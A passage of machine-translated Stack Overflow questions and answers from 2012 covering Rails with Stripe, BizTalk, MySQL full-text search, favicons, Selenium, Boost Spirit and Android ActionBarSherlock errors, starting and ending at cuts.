    (function animloop() {
        requestAnimFrame(animloop);
        var x = new Date().getTime() - (this.time || new Date().getTime());
        this.time = new Date().getTime();
        balls.update(x);
        balls.collision(x);
        balls.frames();
        balls.redraw();
    })();
}; 
```

但是，由于您不会构造 的另一个实例`Balls`，因此单个对象也足够了。

另外，一个大问题是`Object.prototype.ball =`。无论最初应该做什么，它只起作用`window`，因为全局范围对象继承自`Object.prototype`- 您创建了一种全局变量。然而，您的应用程序中的所有其他对象也将继承此**可枚举**属性 - 啊！

但是，您应该在适当的地方使用原型对象 - 例如用于您的`Ball`对象。

请参阅更新的小提琴：http: [//jsfiddle.net/PRgTn/6/](http://jsfiddle.net/PRgTn/6/)

# ruby-on-rails - Rails + Stripe：在哪里存储用户的订阅类型？

> ID：13524689
> 
> 赞同：3
> 
> 时间：2012-11-23T07:25:58.130
> 
> 标签：ruby-on-rails, ruby-on-rails-3, architecture, stripe-payments

Rails newb 在这里，所以在答案中添加尽可能多的细节，并随时告诉我我做错了。

背景：我正在构建一个 SaaS rails 应用程序并计划很快添加条带（支付）集成。我想在集成条带之前构建区分各种帐户类型（订阅计划）的功能。

我在整个应用程序中使用了许多 if / else 语句，具体取决于帐户类型（例如，免费、1 级、2 级）来向用户显示/隐藏适当的功能。我的基本陈述如下所示：

```
<% if current_user.account_level == "1" %>
    your account level is 1
<% elsif current_user.account_level == "2" %>
    your account level is 2
<% else %>

<% end %> 
```

这假设我正在记录用户在用户模型（或其他模型）中的“帐户级别”。这是合适的地方吗？从技术上讲，Stripe 拥有最新的数据（即如果卡取消，帐户级别会有所不同）。我应该直接使用 Stripe api 来确定帐户级别吗？似乎我应该在我的数据中的某个地方记录下来。

在知道我将来会集成 Stripe 的情况下，我在开发过程中是否应该牢记任何其他最佳实践？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-01-01T19:39:22.390

虽然您是对的，Stripe 将存储最新数据，但我建议您为您经常使用的任何内容（如订阅状态）维护一个本地缓存。

您可以使用两种主要方法来确保您的数据库具有最新状态：

*   在您对 Stripe 进行 API 调用的代码中，请确保您还更新了本地副本，或者

*   使用我们的[webhook](https://stripe.com/docs/webhooks)来监听与您的客户相关的事件（例如，`customer.subscription.updated`）。通过这样做，您可以确保您的本地数据库始终与 Stripe 匹配——即使您通过仪表板更改客户的计划，您的 webhook 端点也会收到更新。

将这些数据存储在本地的主要好处是速度：您很可能不希望您的客户为访问此数据的每个请求等待 API 调用，尤其是因为您似乎在整个网站都需要它。

您需要确保将[客户 ID](https://stripe.com/docs/api#customer_object)存储在数据库中，以便将 Stripe 客户与本地用户进行匹配。

# biztalk - Biztalk 2010 ESB行程自定义Resolver和实体框架连接

> ID：13524690
> 
> 赞同：1
> 
> 时间：2012-11-23T07:26:14.697
> 
> 标签：biztalk, esb

我创建了一个自定义解析器并使用实体框架 4.0 的数据访问层从数据库中获取数据，实体框架连接字符串保存在 BTSNtsvc.exe.config 文件中

```
<add name="MadagascarDbEntities" 
    connectionString="metadata=res://*MadDb.csdl|res://*/MadDb.ssdl|res://*/MadDb.msl;provider=System.Data.SqlClient;provider 
    connection string=&quot;data source=ttttt;initial catalog=MadagascarDb;persist security info=True;user id=eeeee;password=xxxxxx;multipleactiveresultsets=True;App=EntityFramework&quot;" 
    providerName="System.Data.EntityClient" /> 
```

但是我收到以下错误...

```
The invoked member is not supported in a dynamic assembly. 
Source: Microsoft.Practices.ESB.Resolver.ResolverMgr 
Method: System.Collections.Generic.Dictionary`2[System.String,System.String] Resolve(Microsoft.Practices.ESB.Resolver.ResolverInfo, Microsoft.BizTalk.Message.Interop.IBaseMessage, Microsoft.BizTalk.Component.Interop.IPipelineContext) 
Error Source: mscorlib 
Error TargetSite: System.IO.Stream GetManifestResourceStream(System.String) 
Error StackTrace: at System.Reflection.Emit.InternalAssemblyBuilder.GetManifestResourceStream(String name) 
```

任何线索？

谢谢你的帮助

# java - Andengine视差背景

> ID：13524703
> 
> 赞同：0
> 
> 时间：2012-11-23T07:27:31.983
> 
> 标签：java, android, andengine

背景：我正在制作一个 2D 横向卷轴。当玩家触摸屏幕时，玩家会向前移动（相机跟随玩家）。

我找不到这个问题的答案，尽管它看起来很简单。

问题：如何让我的视差背景仅在我的玩家移动时滚动？（示例代码对我来说会让事情变得更容易）

我正在使用 autoparallaxbackground 但它似乎只是以您传入的速率滚动，而不考虑相机。此外，我不完全确定 autoparallaxbackground 和 parallaxbackground 之间的区别。

任何帮助表示赞赏！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T08:52:58.750

`AutoParallaxBackground`extends `ParallaxBackground`，添加了一个简单的特性：`mParallaxValue`随时间自动变化。可以想象，如果您不需要背景不断移动，您可以将`ParallaxBackground`其用作您的基类，然后使用它`setParallaxValue(final float pParallaxValue)`来手动调整位置。

# mysql - 没有停用词或最小字长的 MySQL 文本索引

> ID：13524720
> 
> 赞同：0
> 
> 时间：2012-11-23T07:29:24.303
> 
> 标签：mysql, full-text-search, stop-words

我对在 MySQL 中执行全文搜索很感兴趣，但我特别感兴趣的词往往是短词，或者可能出现在停止列表中的词。例如，我可能想要搜索所有以“It is”开头的条目。

最好的方法是什么？我是否应该手动删除所有停用词并将最小字长设置为 0？还是有其他方法可以做到这一点？

非常感谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-02T15:00:37.533

在 my.ini 文本文件 (MySQL) 中：

```
ft_stopword_file = ""   or link an empty file "empty_stopwords.txt"
ft_min_word_len = 2 
```

// 设置最小长度，但要注意较短的单词 (3,2) 会显着增加查询时间，尤其是在全文索引列字段很大的情况下。

保存文件，重启服务器。

下一步应该是使用此查询修复索引：

```
REPAIR TABLE tbl_name QUICK. 
```

但是，如果您的表使用 InnoDB 存储引擎，这将不起作用。您必须将其更改为 MyISAM ：

```
ALTER TABLE t1 ENGINE = MyISAM; 
```

所以，再一次：

1.  编辑 my.ini 文件并保存
2.  重新启动服务器（这不能动态完成）
3.  更改表引擎（如果需要） ALTER TABLE tbl_name ENGINE = MyISAM;
4.  执行修复 REPAIR TABLE tbl_name QUICK。

请注意，InnoDB 和 MyISAM 有它们的速度差异。一个读得更快，另一个写得更快（在互联网上阅读更多相关信息）

# visual-studio-2010 - 我正在使用 VS10，我收到此错误“文本溢出不是已知的 CSS 属性”

> ID：13524726
> 
> 赞同：1
> 
> 时间：2012-11-23T07:29:48.120
> 
> 标签：visual-studio-2010, css

我已经 *为 Microsoft Visual Studio 2010 SP1安装了**CSS 3 Intellisense Schema*和 Web Standards Update 。VS 仍然没有将其识别为有效属性。可能是什么问题呢？

# wifi - 在使用本机 WiFi 检索传入帧数时区分 MSDU、MMPDU？

> ID：13524727
> 
> 赞同：2
> 
> 时间：2012-11-23T07:29:50.717
> 
> 标签：wifi

我在使用 Mircosoft Native Wifi API 时遇到了一些问题。

我可以使用 queryinterface 函数来获取计数器的当前值以了解接收到的帧。

但统计不仅涉及MSDU，还涉及MMPDU和MPDU，导致结果不准确。作为链接：[查看网站](http://msdn.microsoft.com/en-us/library/windows/hardware/ff569420%28v=vs.85%29.aspx)

此结构的成员用于记录以下 MAC 级别的统计信息：

MAC 服务数据单元 (MSDU) 数据包。

MAC 协议数据单元 (MPDU) 帧。

MPDU 帧计数器必须包括为 MSDU 数据包发送的所有 MPDU 片段。

管理 MPDU (MMPDU) 帧。

那么，有没有办法只获得接收到的 MSDU 数量？？？谢谢！！

# ms-word - 在 Microsoft Word 中使用逗号分隔单词列表

> ID：13524728
> 
> 赞同：1
> 
> 时间：2012-11-23T07:29:52.350
> 
> 标签：ms-word

我有一长串单词

```
Rolls Royce
Volkswagen
Aston Martin
Audi
BMW
Mercedes-Benz
Porsche
Bentley 
```

如何使这些单词以逗号分隔，例如 ...BMW，Audi ...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T07:36:07.987

使用查找并替换以下输入：

```
find: ^p
replace: , 
```

# magento-1.4 - Magento 版本升级问题 - 违反完整性约束 - mysql4-install-1.4.0.8.php

> ID：13524730
> 
> 赞同：1
> 
> 时间：2012-11-23T07:30:02.750
> 
> 标签：magento-1.4, magento-1.7, magento

当我尝试将我的 Magento 版本从 1.4 升级到 1.7 时，我收到以下错误。请帮忙

**文件错误：** “/home/public_html/app/code/core/Mage/XmlConnect/sql/xmlconnect_setup/mysql4-install-1.4.0.8.php” - SQLSTATE [23000]：完整性约束违规：1062重复条目'3-键 'entity_type_id' 的缩略图'

```
Trace:
0 /home/public_html/app/code/core/Mage/Core/Model/Resource/Setup.php(390):
Mage::exception('Mage_Core', 'Error in file: ...')                                                                                    

/home/public_html/app/code/core/Mage/Core/Model/Resource/Setup.php(276):
Mage_Core_Model_Resource_Setup->_modifyResourceDb('install', '', '1.6.0.0')
2 /home/public_html/app/code/core/Mage/Core/Model/Resource/Setup.php(240):
Mage_Core_Model_Resource_Setup->_installResourceDb('1.6.0.0')
3 /home/public_html/app/code/core/Mage/Core/Model/Resource/Setup.php(161):
Mage_Core_Model_Resource_Setup->applyUpdates()
4 /home/public_html/app/code/core/Mage/Core/Model/App.php(363):
Mage_Core_Model_Resource_Setup::applyAllUpdates()
5 /home/public_html/app/code/core/Mage/Core/Model/App.php(295): 
Mage_Core_Model_App->_initModules()
6 /home/public_html/app/Mage.php(596): Mage_Core_Model_App->run(Array)
7 /home/public_html/index.php(82): Mage::run('', 'store')
  8 {main} 
```

# asp.net - Favicon 未在网页上显示

> ID：13524740
> 
> 赞同：3
> 
> 时间：2012-11-23T07:30:45.990
> 
> 标签：asp.net, html, favicon

我无法在网页上显示网站图标。我正在使用 IE8。我在`.aspx`页面中使用了以下标记：

```
<head runat="server">
  <link rel="shortcut icon" href="Images/favicon.ico" />
</head> 
```

我已将`favicon.ico`文件保存在`Images`.

它显示在 Firefox 和 Chrome 等其他浏览器上，但我希望它显示在 IE 上。在 IE 中要做哪些设置？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T07:52:56.327

你不能采取一些行动：

1.  将链接元素设置为`runat=server`
2.  将 favicon.ico 移至根目录（如果可以）。
3.  使用条件注释显示旧 IE 的 favicon
4.  清除浏览器缓存。

## 代码结果：

```
<link runat="server" rel="shortcut icon" href="Images/favicon.ico" type="image/x-icon" />
<link runat="server" rel="icon" href="Images/favicon.ico" type="image/ico" />
<!--[if IE]>
<link rel="shortcut icon" href="Images/favicon.ico" type="image/vnd.microsoft.icon" />
<![endif]--> 
```

## 更远：

如果您只是将它放在根文件夹中，大多数浏览器都会选择它，因此即使您还有一个指向它的链接标签，这也是放置它的最佳位置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:46:44.620

确保文件名必须是`favicon.ico`，并将其放在根文件夹中，而不是图像内。它也会显示在 IE 中。不要忘记清除缓存。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T07:47:28.160

尝试使用这个：

```
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" /> 
```

# selenium-ide - 硒 find_element_by_id 返回无

> ID：13524741
> 
> 赞同：0
> 
> 时间：2012-11-23T07:30:48.187
> 
> 标签：selenium-ide, python-2.6

我正在使用 selenium，并且我已经在 redhat linux 6 上正确安装了 selenium 模块。下面是我的脚本：

```
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import unittest, time, re
import zlib

class Sele1(unittest.TestCase):
    def setUp(self):
        self.driver = webdriver.Firefox()
        self.driver.implicitly_wait(30)
        self.base_url = "https://bugzilla.example.com/"
        self.verificationErrors = []

    def test_sele1(self):
        driver = self.driver
        driver.get(self.base_url + "/")
        driver.find_element_by_id("Bugzilla_login").clear()
        driver.find_element_by_id("Bugzilla_login").send_keys("username")
        driver.find_element_by_id("Bugzilla_password").clear()
        driver.find_element_by_id("Bugzilla_password").send_keys("password")
        driver.find_element_by_id("log_in").click()
        driver.find_element_by_id("quicksearch").clear()
        driver.find_element_by_id("quicksearch").send_keys("new bugs is bugzilla tool")
        driver.find_element_by_xpath("//input[@value='Find Bugs']").click()

    def is_element_present(self, how, what):
        try: self.driver.find_element(by=how, value=what)
        except NoSuchElementException, e: return False
        return True

    def tearDown(self):
        self.driver.quit()
        self.assertEqual([], self.verificationErrors)

if __name__ == "__main__":
    unittest.main() 
```

当我运行此脚本时，它显示错误：

## 错误：test_sele1（**主要**.Sele1）

Traceback（最近一次调用最后一次）：文件“sele1.py”，第 19 行，在 test_sele1 driver.find_element_by_id("Bugzilla_login").clear() AttributeError: 'NoneType' object has no attribute 'clear'

* * *

在 2.018 秒内运行 1 次测试

失败（错误=1）

平台：Redhat Python 版本：2.6

注意：在 windows7 中运行相同的脚本时，它运行良好，但在 python2.6 的 linux 中没有运行

请帮助我...提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T17:05:43.633

很简单：Selenium 找不到名为“Bugzilla_login”的元素。

发生这种情况的原因可能有数百个。我会先检查您是否加载了正确的页面。

# visual-studio - 使用 ColumnAttribute 的不明确引用

> ID：13524743
> 
> 赞同：0
> 
> 时间：2012-11-23T07:30:55.210
> 
> 标签：visual-studio, entity-framework

在一个项目中，我能够毫无问题地使用 ColumnAttribute。

在另一个，不是。我在测试项目中有以下课程：

```
class TestClass_x
{
  [Key, Column(Order = 0)]
  public int i { get; set; }

  [Key, Column(Order = 1)]
  public string i2 { get; set; }

  public string str { get; set; }
} 
```

导致

```
Ambigous reference:
 System.ComponentModel.DataAnnotations.Schema.ColumnAttribute
 System.ComponentModel.DataAnnotations.Schema.ColumnAttribute
match 
```

我在测试项目中添加了以下引用：

*   实体框架（v 4.4.0.0）
*   要测试的项目
*   另一个要测试的项目
*   第三个要测试的项目
*   Microsoft.VisualStudio.Quality.Tools.UnitTestFramework (v 10.0.0.0)
*   PresentationFramework (v 4.0.0.0)
*   系统 (v 4.0.0.0)
*   System.ComponentModel.DataAnnotations (v 4.0.0.0)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T10:18:17.910

您使用的是 .NET 4.5 吗？在这种情况下，您将`ColumnAttribute`同时拥有 System.ComponentModel.DataAnnotations.dll 和 EntityFramework.dll。解决方案应该是将 EntityFramework 升级到 5.0，因为 4.4 版仅适用于 .NET 4.0。

# c++ - BOOST_SPIRIT_DEBUG_NODE 无法在变体节点上编译

> ID：13524744
> 
> 赞同：0
> 
> 时间：2012-11-23T07:30:58.237
> 
> 标签：c++, boost-spirit

以下代码不会编译 BOOST_SPIRIT_DEBUG_NODE( expression ) ，其中 expression 是一个变体节点（不过，我不是 100% 某些变体节点与它有任何关系）。

如果我注释掉这一行，一切似乎都运行正常。

对编译错误进行眼球分析，我看到：

```
/usr/local/include/boost/spirit/home/support/attributes.hpp:1203:13: error: cannot bind ‘std::basic_ostream<char>’ lvalue to ‘std::basic_ostream<char>&&’ 
```

如果这还不足以告诉我们错误的原因，请编译下面的代码，以获得详细的编译转储。

**请注意，代码与文档中的示例 95% 相同。**

我只是`std::string`在变体类型中添加了一个并尝试添加有用的 BOOST_SPIRIT_DEBUG_NODE() 以便我可以看到发生了什么。

```
#define BOOST_SPIRIT_DEBUG

#include <boost/spirit/include/qi.hpp>
#include <boost/config/warning_disable.hpp>
#include <boost/spirit/include/qi.hpp>
#include <boost/spirit/include/phoenix_core.hpp>
#include <boost/spirit/include/phoenix_operator.hpp>
#include <boost/spirit/include/phoenix_stl.hpp>
#include <boost/spirit/include/classic_symbols.hpp>
#include <boost/fusion/include/adapt_struct.hpp>
#include <boost/fusion/include/io.hpp>
#include <boost/algorithm/string.hpp>
#include <boost/regex.hpp>   // std::regex not fully implemented in stdc++ yet

#include <string>
#include <map>
#include <utility>
#include <functional>
#include <iostream>
#include <string>
#include <vector>

namespace client
{
    namespace qi = boost::spirit::qi;
    namespace ascii = boost::spirit::ascii;

    struct binary_op;
    struct unary_op;
    struct nil {};

    struct expression_ast
    {
        typedef
        boost::variant<
        nil // can't happen!
        , double
        , std::string
        , boost::recursive_wrapper<expression_ast>
        , boost::recursive_wrapper<binary_op>
        , boost::recursive_wrapper<unary_op>
        >
        type;

        expression_ast()
            : m_expr(nil()) {}

        template <typename Expr>
        expression_ast(Expr const& expr)
            : m_expr(expr) {}

        expression_ast& operator+=(expression_ast const& rhs);
        expression_ast& operator-=(expression_ast const& rhs);
        expression_ast& operator*=(expression_ast const& rhs);
        expression_ast& operator/=(expression_ast const& rhs);

        type m_expr;
    };

    struct binary_op
    {
        binary_op(
            char op
            , expression_ast const& left
            , expression_ast const& right)
            : m_op(op), m_left(left), m_right(right) {}

        char m_op;
        expression_ast m_left;
        expression_ast m_right;
    };

    struct unary_op
    {
        unary_op(
            char op
            , expression_ast const& subject)
            : m_op(op), m_subject(subject) {}

        char m_op;
        expression_ast m_subject;
    };

    expression_ast& expression_ast::operator+=(expression_ast const& rhs)
    {
        m_expr = binary_op('+', m_expr, rhs);
        return *this;
    }

    expression_ast& expression_ast::operator-=(expression_ast const& rhs)
    {
        m_expr = binary_op('-', m_expr, rhs);
        return *this;
    }

    expression_ast& expression_ast::operator*=(expression_ast const& rhs)
    {
        m_expr = binary_op('*', m_expr, rhs);
        return *this;
    }

    expression_ast& expression_ast::operator/=(expression_ast const& rhs)
    {
        m_expr = binary_op('/', m_expr, rhs);
        return *this;
    }

    // We should be using expression_ast::operator-. There's a bug
    // in phoenix type deduction mechanism that prevents us from
    // doing so. Phoenix will be switching to BOOST_TYPEOF. In the
    // meantime, we will use a phoenix::function below:
    struct negate_expr
    {
        template <typename T>
        struct result
        {
            typedef T type;
        };

        expression_ast operator()(expression_ast const& expr) const
        {
            return expression_ast(unary_op('-', expr));
        }
    };

    static boost::phoenix::function<negate_expr> neg;

    struct ast_print
    {
        typedef std::string result_type;

        std::string operator()(qi::info::nil) const
        {
            return "";
        }
        std::string operator()(std::string const& str) const
        {
            return str;
        }
        std::string operator()(double d) const
        {
            std::ostringstream oss;
            oss << d;
            return oss.str();
        }

        std::string operator()(expression_ast const& ast) const
        {
            return boost::apply_visitor(*this, ast.m_expr);
        }

        std::string operator()(binary_op const& expr) const
        {
            std::ostringstream oss;
            oss << "op:" << expr.m_op << "(";
            oss << boost::apply_visitor(*this, expr.m_left.m_expr);
            oss << ", ";
            oss << boost::apply_visitor(*this, expr.m_right.m_expr);
            oss << ')';
            return oss.str();
        }

        std::string operator()(unary_op const& expr) const
        {
            std::ostringstream oss;
            oss << "op:" << expr.m_op << "(";
            oss << boost::apply_visitor(*this, expr.m_subject.m_expr);
            oss << ')';
            return oss.str();
        }
    };

    template <typename Iterator>
    struct ParserGenerator : qi::grammar<Iterator, expression_ast(), ascii::space_type>
    {
        ParserGenerator() : ParserGenerator::base_type(expression)
    {
        using qi::_val;
        using qi::_1;
        using qi::double_;
        using qi::iso8859_1::char_;
        using qi::iso8859_1::space;
        using qi::eol;

        comment =
            space >> ("//" >> *(char_ - eol) >> eol)
            ;

        expression =
            term                            [_val = _1]
            >> *(   ('+' >> term            [_val += _1])
                |   ('-' >> term            [_val -= _1])
                )
            ;

        term =
            factor                          [_val = _1]
            >> *(   ('*' >> factor          [_val *= _1])
                |   ('/' >> factor          [_val /= _1])
                )
            ;

        factor =
              symbol                        [_val = _1]
            | double_                       [_val = _1]
            |   '(' >> expression           [_val = _1] >> ')'
            |   ('-' >> factor              [_val = neg(_1)])
            |   ('+' >> factor              [_val = _1])
            ;

        symbol %= boost::spirit::lexeme[ +(qi::char_ - qi::char_("()-+*/")) ]
            ;

        BOOST_SPIRIT_DEBUG_NODE(expression);     // <--- TROUBLE COMPILING THIS LINE
        BOOST_SPIRIT_DEBUG_NODE(symbol);
    }

    qi::rule<Iterator, expression_ast(), ascii::space_type>
        expression, term, factor, comment;

    qi::rule<Iterator, std::string(), ascii::space_type>
        symbol;
    };
}

int main(int argc, char* argv[])
{
    using boost::spirit::ascii::space;
    using client::expression_ast;
    using client::ast_print;

    typedef std::string::const_iterator iterator_type;
    typedef client::ParserGenerator<iterator_type> ParserGenerator;

    ParserGenerator pg;   // our grammar
    std::string predicate( "i_.c+x[0]" );
    expression_ast  ast;
    ast_print       printer;

    iterator_type iter = predicate.begin(), end = predicate.end();
    if ( phrase_parse( iter, end, pg, space, ast ))
    {
        std::cerr << printer( ast ) << std::endl;
    }

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T07:41:55.173

错误在这里

> 初始化 «std::basic_ostream<_CharT, _Traits>& std::operator<<(std::basic_ostream<_CharT, _Traits>&&, const _Tp&) 的参数 1 [with _CharT = char, _Traits = std::char_traits, _Tp = 客户::expression_ast]»

您`operator <<`的`expression_ast`.

```
std::ostream& operator << (std::ostream& stream, const expression_ast& expr)
{
   ast_print printer;
   stream << printer(expr) << std::endl;
   return stream;
} 
```

通过这个简单的添加为我编译。

# android - 操作栏错误

> ID：13524745
> 
> 赞同：0
> 
> 时间：2012-11-23T07:30:58.213
> 
> 标签：android, android-actionbar, actionbarsherlock

我正在尝试使用 SharLock 库创建操作栏，我在我的项目中添加了 Sharlock 库。

这是我的代码，

```
public class MainActivity extends SherlockActivity implements ActionBar.OnNavigationListener {

        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);

            Button btnClick=(Button)findViewById(R.id.clickMe);
            btnClick.setOnClickListener(new OnClickListener() {

                @Override
                public void onClick(View arg0) {
                    // TODO Auto-generated method stub
                    Intent intent=new Intent(MainActivity.this,ListNavigation.class);
                    startActivity(intent);
                }
            });
        }

        @Override
        public boolean onNavigationItemSelected(int itemPosition, long itemId) {
            // TODO Auto-generated method stub
            return false;
        } 
```

在我的清单代码中，

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.actionbar"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="16" />

    <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name" >
        <activity
            android:name=".MainActivity"
            android:label="@string/app_name" android:theme="@style/Theme.Sherlock">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest> 
```

一旦我使用扩展 SherlockActivity 实现 ActionBar.OnNavigationListener，我就会收到这样的错误，

```
11-23 12:56:48.811: ERROR/AndroidRuntime(3047): FATAL EXCEPTION: main
11-23 12:56:48.811: ERROR/AndroidRuntime(3047): java.lang.RuntimeException: Unable to instantiate activity ComponentInfo{com.example.actionbar/com.example.actionbar.MainActivity}: java.lang.ClassNotFoundException: com.example.actionbar.MainActivity in loader dalvik.system.PathClassLoader[/data/app/com.example.actionbar-1.apk]
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2585)
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2679)
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     at android.app.ActivityThread.access$2300(ActivityThread.java:125)
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2033)
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     at android.os.Handler.dispatchMessage(Handler.java:99)
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     at android.os.Looper.loop(Looper.java:123)
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     at android.app.ActivityThread.main(ActivityThread.java:4627)
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     at java.lang.reflect.Method.invokeNative(Native Method)
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     at java.lang.reflect.Method.invoke(Method.java:521)
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:860)
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:618)
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     at dalvik.system.NativeStart.main(Native Method)
11-23 12:56:48.811: ERROR/AndroidRuntime(3047): Caused by: java.lang.ClassNotFoundException: com.example.actionbar.MainActivity in loader dalvik.system.PathClassLoader[/data/app/com.example.actionbar-1.apk]
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     at dalvik.system.PathClassLoader.findClass(PathClassLoader.java:243)
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     at java.lang.ClassLoader.loadClass(ClassLoader.java:573)
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     at java.lang.ClassLoader.loadClass(ClassLoader.java:532)
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     at android.app.Instrumentation.newActivity(Instrumentation.java:1021)
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2577)
11-23 12:56:48.811: ERROR/AndroidRuntime(3047):     ... 11 more 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:41:48.070

logcat 声明您启动了 Activity ：

```
com.example.acctionbar.MainActivity 
```

acccccctionbar 中有两个 c。在您的代码中搜索此拼写并将其更改为一个 c。

# android - 由RelativeLayout中的循环依赖引起的奇怪的IllegalStateException

> ID：13524751
> 
> 赞同：1
> 
> 时间：2012-11-23T07:31:50.327
> 
> 标签：android, android-relativelayout, illegalstateexception

我在我的 Android 项目中遇到了一个奇怪的错误。有时应用程序会因此 IllegalStateException 而崩溃：

```
11-23 08:20:51.610: E/AndroidRuntime(16714): FATAL EXCEPTION: main
11-23 08:20:51.610: E/AndroidRuntime(16714): java.lang.IllegalStateException: Circular dependencies cannot exist in RelativeLayout
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.widget.RelativeLayout$DependencyGraph.getSortedViews(RelativeLayout.java:1286)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.widget.RelativeLayout.sortChildren(RelativeLayout.java:294)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.widget.RelativeLayout.onMeasure(RelativeLayout.java:314)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.view.View.measure(View.java:12775)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:4709)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.widget.LinearLayout.measureChildBeforeLayout(LinearLayout.java:1385)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.widget.LinearLayout.measureVertical(LinearLayout.java:670)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.widget.LinearLayout.onMeasure(LinearLayout.java:563)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.view.View.measure(View.java:12775)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:4709)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.widget.FrameLayout.onMeasure(FrameLayout.java:293)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.view.View.measure(View.java:12775)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.widget.LinearLayout.measureVertical(LinearLayout.java:822)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.widget.LinearLayout.onMeasure(LinearLayout.java:563)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.view.View.measure(View.java:12775)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:4709)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.widget.FrameLayout.onMeasure(FrameLayout.java:293)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at com.android.internal.policy.impl.PhoneWindow$DecorView.onMeasure(PhoneWindow.java:2240)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.view.View.measure(View.java:12775)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.view.ViewRootImpl.performTraversals(ViewRootImpl.java:1117)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.view.ViewRootImpl.handleMessage(ViewRootImpl.java:2505)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.os.Handler.dispatchMessage(Handler.java:99)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.os.Looper.loop(Looper.java:137)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at android.app.ActivityThread.main(ActivityThread.java:4514)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at java.lang.reflect.Method.invokeNative(Native Method)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at java.lang.reflect.Method.invoke(Method.java:511)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:790)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:557)
11-23 08:20:51.610: E/AndroidRuntime(16714):    at dalvik.system.NativeStart.main(Native Method) 
```

我知道这应该是由 RelativeLayout 中的两个小部件相互引用引起的，但这里绝对不是这种情况。我在这个布局文件中使用了一个 RelativeLayout（在底部）：

```
<LinearLayout xmlns:tools="http://schemas.android.com/tools"
xmlns:android="http://schemas.android.com/apk/res/android"
android:id="@+id/LinearLayout1"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:orientation="vertical" >

<LinearLayout
    android:layout_width="match_parent"
    android:layout_height="450dp" >

    <fragment
        android:id="@+id/identification_navigation_fragment"
        android:name="plt.demonstrator.common.NavigationFragment"
        android:layout_width="0dp"
        android:layout_height="match_parent"
        android:layout_weight="1" />

    <View
        android:id="@+id/view1"
